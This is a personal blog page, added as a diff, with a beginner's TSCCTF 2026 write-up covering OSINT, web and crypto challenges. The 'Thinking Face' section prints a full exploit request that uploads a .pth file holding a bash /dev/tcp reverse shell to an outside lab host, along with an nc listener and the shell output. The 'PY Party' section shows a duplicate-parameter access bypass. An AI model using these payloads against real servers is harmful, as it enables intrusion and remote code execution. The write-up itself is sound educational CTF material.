@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <title>
+[CTF] TSCCTF 2026 Write-up and some of my thoughts | xid3
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="">
+
+<meta name="generator" content="Hugo 0.155.3">
+
+
+<link rel="canonical" href="https://xxid3.github.io/post/tscctf2026/" >
+
+
+
+
+<link href="/css/style.min.5eb7b193e6ce9eab3699821eb02b4c553c6cc064c913d2659ac37624d9b7520d.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a class="terminal" href="/">
+                <span>xid3@home ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="https://xxid3.github.io/about" title="" >
+                        ~/about</a>
+                </li>
+                
+                <li>
+                    <a href="https://xxid3.github.io/articles" title="" >
+                        ~/articles</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>[CTF] TSCCTF 2026 Write-up and some of my thoughts</h1>
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+
+    
+    <section class="postMetadata">
+        <dl>
+            
+                
+<dt>tags</dt>
+<dd><span></span>
+    <a href="/tags/ctf/">#CTF</a></dd>
+            
+            
+            
+            
+                <dt>published</dt>
+                 
+                 
+                 <dd><time datetime="2026-03-01">2026-03-01</time></dd>
+            
+            
+        </dl>
+    </section>
+    
+    <div>
+        <h2 id="my-thoughts">My thoughts</h2>
+<p>This is my first time to participate in CTF competition, though I&rsquo;ve gotten into cybersecurity field since the last summer. In the past few months, most time I just leared some basic ideas of web penetration testing (and not yet fininished lol) on HTB, and also played some beginner labs on picoCTF.
+In this competition, I found that most of the web problems in CTF are not straightforward, I can&rsquo;t solve them with just a single approach, like just using SQLi or command injection.</p>
+<p>The second thing I found is that the key concepts being tested in web CTF are more like code reviewing or finding logic vulnerabilities in web app (white box pentesting), the common vulnerabilities of web app (such as SQLi just mentioned) are like background knowledges you should know, so I thought that the barrier to entry for web CTF is higher than my expected before.</p>
+<p>Finally, since I joined this CTF&rsquo;s discord server, I found that a part of people used LLM agents to solve most of the challenges (almost all challenges), I started to think if I should continue to work on CTF as LLM can do perfectly on this kind of competition, and I don&rsquo;t know whether CTF will vanish in the next few years.</p>
+<p>Anyway, I really enjoy cybersecurity and everything related to IT, now I will keep learing on web penetration testing.</p>
+<h2 id="write-up">Write-up</h2>
+<p>I only solve very few problems, this write-up is just for recording the experiences I had.</p>
+<h3 id="misc">Misc</h3>
+<h4 id="welcome">Welcome</h4>
+<ul>
+<li>Describtion:
+The flag is on TSCCTF&rsquo;s latest Facebook post!</li>
+<li>Solution:
+<img src="https://hackmd.io/_uploads/Sk3a7wZFZg.png" alt="image">
+Base64 decode the bottom string.
+<code>Flag: TSC{Welcome_2_TSCCTF_2026$$$}</code></li>
+</ul>
+<h4 id="on-some-integrated-numinous-transportation">On Some Integrated Numinous Transportation</h4>
+<ul>
+<li>Describtion: This is an OSINT challenge
+Your friend post an image on facebook when traveling. Seems like it is taken on some kind of transportation. Can you find out which the transportation is?
+Flag format: <code>TSC{&lt;transportation name in all lower case&gt;}</code>
+For example. If the answer is Taiwan High Speed Rail. The flag will be <code>TSC{taiwan_high_speed_rail}</code>
+The SHA1 hash for the correct flag is <code>f23d3ecff0b498df38134b266f59a66ceb7e7c82</code> (no line feed)</li>
+<li>Solution:
+Saw 101 in the picture, and there are some cables in the above of picture, so I guess it is <code>Maokong Gondola</code>.
+The SHA1 hash of <code>TSC{maokong_gondola}</code> is <code>f23d3ecff0b498df38134b266f59a66ceb7e7c82</code>, so the guess is right.
+<code>Flag: TSC{maokong_gondola}</code></li>
+</ul>
+<h3 id="web">Web</h3>
+<h4 id="py-party">PY Party</h4>
+<ul>
+<li>Describtion:
+
+<a href="https://www.youtube.com/watch?v=qFWBoP5Zl-E" target="_blank" rel="noopener">PY Party</a>
+</li>
+<li>Solution:
+Seems this video is not associated with the challenge.
+Let&rsquo;s first take a look at its source codes:
+<pre tabindex="0"><code class="language-python=" data-lang="python=">cur.execute(
+    &#34;INSERT INTO posts (title, body, is_private, author_id) VALUES (?, ?, ?, ?)&#34;,
+    (
+        &#34;Welcome&#34;,
+        &#34;Welcome to the blog!&#34;,
+        0,
+        2,
+    ),
+)
+cur.execute(
+    &#34;INSERT INTO posts (title, body, is_private, author_id) VALUES (?, ?, ?, ?)&#34;,
+    (
+        &#34;Flag&#34;,
+        f&#34;{FLAG}&#34;,
+        1,
+        1,
+    ),
+)
+</code></pre>and
+<pre tabindex="0"><code class="language-python=" data-lang="python=">cur.execute(
+    &#34;INSERT INTO users (username, password_hash, is_admin) VALUES (?, ?, ?)&#34;,
+    (&#34;guest&#34;, generate_password_hash(&#34;guest123&#34;), 0),
+)
+</code></pre>It inserted a post that may contains the flag into posts table, which id may be 2.
+Logined as <code>guest:guest123</code>, I visited <code>http://172.31.4.2:40011/post?id=2</code>, but the response is 403 forbidden.
+Let&rsquo;s look at this snippet in <code>@app.route(&quot;/post&quot;)</code>:
+<pre tabindex="0"><code class="language-python=" data-lang="python=">primary_id = request.args.get(&#34;id&#34;, type=int)
+if primary_id is None:
+    return redirect(url_for(&#34;index&#34;))
+
+gate_post = load_post(primary_id)
+if not gate_post:
+    abort(404)
+if gate_post[&#34;is_private&#34;] and not user[&#34;is_admin&#34;] and gate_post[&#34;author_id&#34;] != user[&#34;id&#34;]:
+    abort(403)
+        .
+        .
+raw_query = request.query_string.decode()
+params = dict(sorted(parse_qsl(raw_query, keep_blank_values=True)))
+
+selected_id = params.get(&#34;id&#34;, primary_id)
+</code></pre>You can see that this app uses two different functions to handle the requested post id, the first <code>primary_id = request.args.get(&quot;id&quot;, type=int)</code> will only receive the first id we supply, and check if it is not private and the author id is our id (guest).
+The second <code>raw_query = request.query_string.decode()</code> and
+<code>params = dict(sorted(parse_qsl(raw_query, keep_blank_values=True)))</code> will also receive one of id we supply, but the <code>dict(sorted())</code> will reserve the biggest id value as the final value (since <code>dict()</code> will only reserve the final element while there are more than one elements with the same key), so we can structure our payload as: <code>http://172.31.4.2:40011/post?id=1&amp;id=2</code>, then we can see the post which id = 2.
+<code>Flag: TSCCTF{Ha_Ha_PY_ppppparty_79e611e4d3b91903}</code></li>
+</ul>
+<h4 id="thinking-face">🤔Thinking Face</h4>
+<ul>
+<li>
+<p>Describtion:
+Thinking Face is a machine learning and AI platform that helps developers, researchers, and organizations to share ML models. It provides the Thinking Face Hub, a centralized repository where users can discover numerous open-source models, download them, share them, and collaborate with the community.</p>
+</li>
+<li>
+<p>Solution:
+After registering an accout and logging in, I see that the <code>admin</code> had one model, and I don&rsquo;t have any. On this web app, what I can do are just see other&rsquo;s models, logout and see my models but nothing. Then I took a look at its source codes:</p>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">elif action == &#39;upload&#39;:
+    if not token or (user:= get_session_user(token)) is None:
+        print()
+        print(json.dumps({&#39;ok&#39;: False, &#39;error&#39;: &#39;not authenticated&#39;}))
+        exit(0)
+    form = get_http_form()
+    name = form[&#39;name&#39;] if &#39;name&#39; in form else None
+    description = form[&#39;description&#39;] if &#39;description&#39; in form else &#39;&#39;
+    file = form[&#39;file&#39;] if &#39;file&#39; in form else None
+</code></pre><p>which indicated that I can upload my model with parameters <code>name</code> and <code>file</code>, maybe I can perform <strong>file upload attacks</strong>.
+Then I found another function:</p>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">elif action == &#39;change_owner&#39;:
+    if not token or (user:= get_session_user(token)) is None:
+        print()
+        print(json.dumps({&#39;ok&#39;: False, &#39;error&#39;: &#39;not authenticated&#39;}))
+        exit(0)
+    model_id = qs.get(&#39;id&#39;, [&#39;&#39;])[0]
+    new_owner = qs.get(&#39;new_owner&#39;, [&#39;&#39;])[0]
+    if not model_id or not model_id.isdigit() or not new_owner or re.search(r&#39;[^a-zA-Z0-9_\-/]&#39;, new_owner):
+        print()
+        print(json.dumps({&#39;ok&#39;: False, &#39;error&#39;: &#39;bad parameters&#39;}))
+        exit(0)
+        .
+        .
+success, msg = change_model_owner(int(model_id), new_owner)
+shutil.move(os.path.join(MODELS_DIR, f&#34;{model[&#39;owner&#39;]}/{model[&#39;filename&#39;]}&#34;),
+            os.path.join(MODELS_DIR, f&#34;{new_owner}/{model[&#39;filename&#39;]}&#34;))
+</code></pre><p>Now I can change the model&rsquo;s owner, and this web app will change the model file to the new owner&rsquo;s directory. And there are 2 flaws in this snippet:</p>
+<ol>
+<li><code>success, msg = change_model_owner(int(model_id), new_owner)</code> didn&rsquo;t check if the new owner actually exists in DB.</li>
+<li>In <code>os.path.join(MODELS_DIR, f&quot;{new_owner}/{model['filename']}&quot;)</code>, if the second parameter starts with <code>/</code>, it will cover the first parameter and the final path return will only be the second parameter.</li>
+</ol>
+<p>Based on these points, we can structure the payload:</p>
+<pre tabindex="0"><code>GET /cgi-bin/models.py?action=upload HTTP/1.1
+Host: 172.31.1.2:31039
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+X-Requested-With: XMLHttpRequest
+Connection: keep-alive
+Referer: http://172.31.1.2:31039/models.html
+Cookie: session=2c8a48e7fb8f4166a8a39c7a16b9d8ea
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: 328
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name=&#34;name&#34;
+
+myshell
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;payload.pth&#34;
+
+import os; os.system(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/172.30.64.10/9001 0&gt;&amp;1&#34;&#39;)
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+</code></pre><p>which sends a reverse shell to the web server, then change the owner to: <code>/usr/lib/python3/dist-packages</code>.
+The reason is that when we request anything that triggers the cgi program, the Python on server will use <code>site</code> module first to scan all the global module directories (to <code>sys.path</code>) it needs to run the program correctly. One of the global module directories is <code>/usr/lib/python3/dist-packages</code>, which means when we request anything like <code>auth.py</code>, the web server will visit the <code>/usr/lib/python3/dist-packages</code> and collect all paths it needs.
+The other mechanism is that if there is a line begin with <code>import XXX</code> in the <code>.pth</code> file, the <code>site</code> module will directly executes this line instead of including it to <code>sys.path</code> as a path, so based on this, we can write a reverse shell to force the server execute it.
+<code>nc -lvnp 9001</code> listening on 9001 to get the reverse shell, and go to the website to send any cgi-bin request, then we RCE the server and get the flag.</p>
+<pre tabindex="0"><code>www-data@26db84900e39:/var/www/cgi-bin$ cat /flag.txt
+cat /flag.txt
+TSC{Tr3ndy_AI_W17h_0ld_f4sh1on__25937ab87dfc422dba394c6ce2a8cb55}
+</code></pre><p><code>Flag: TSC{Tr3ndy_AI_W17h_0ld_f4sh1on__25937ab87dfc422dba394c6ce2a8cb55}</code></p>
+</li>
+</ul>
+<h3 id="crypto">Crypto</h3>
+<h4 id="lattice">Lattice</h4>
+<ul>
+<li>Describtion:
+Easy one, solve it.</li>
+<li>Solution:
+Thanks for Gemini 3.1 Pro.
+exploit code:</li>
+</ul>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">from Crypto.Util.number import long_to_bytes
+from Crypto.Cipher import AES
+from hashlib import sha256
+
+# 已知數據 
+m = 18446744073709551616
+a = 10176098343636197767
+b = 12298458670738556881
+outputs = [3263751489, 2794058500, 2599739732, 541826760, 2524158971, 3310397546, 1256279121, 1738597237, 3440678068, 2521988223]
+enc_hex = &#34;03a40935dc788695dd54157601df8fb3f50b2b0ef874024c241f5e1d41ae3d45c6add9f4008c0b1567fc4f07f08e9cc9fe0c1a22a8008c44dba9a8186d244b03&#34;
+enc = bytes.fromhex(enc_hex)
+
+# 1. 爆破 s1 的低 32 位元 
+print(&#34;正在還原 LCG 狀態...&#34;)
+high_s1 = outputs[0] &lt;&lt; 32
+target_high_s2 = outputs[1]
+
+found_s = None
+for k in range(2**32):
+    current_s = high_s1 + k
+    next_s = (a * current_s + b) % m
+    if (next_s &gt;&gt; 32) == target_high_s2:
+        # 進一步驗證第三個輸出以確保唯一性
+        if ((a * next_s + b) % m) &gt;&gt; 32 == outputs[2]:
+            found_s = current_s
+            print(f&#34;找到原始狀態 s1: {found_s}&#34;)
+            break
+
+if found_s:
+    # 2. 演進到最後一個狀態 s10 
+    # 注意：原本程式碼中 outputs 已經跑了 10 次迴圈，最後的 s 是 outputs[-1] 對應的狀態 
+    s = found_s
+    for i in range(1, 10):
+        s = (a * s + b) % m
+    
+    # 3. 解密 AES 
+    key = sha256(long_to_bytes(s)).digest()[:16]
+    cipher = AES.new(key, AES.MODE_ECB)
+    flag = cipher.decrypt(enc)
+    print(f&#34;解密結果: {flag.decode().strip()}&#34;)
+else:
+    print(&#34;未能找到狀態，請檢查參數。&#34;)
+</code></pre><p><code>Flag: TSCCTF{LLL_c4n_r3c0v3r_h1dd3n_b1ts_fr0m_truncat3d_LCG!}</code></p>
+
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+        <span>
+            © 2026 xid3, Built with
+            <a href="https://gohugo.io" class="footerLink">Hugo</a> and
+            <a href="https://github.com/LordMathis/hugo-theme-nightfall" class="footerLink">Nightfall</a> theme
+        </span>
+    
+</footer>
+    </div>
+
+</body>
+
+</html>
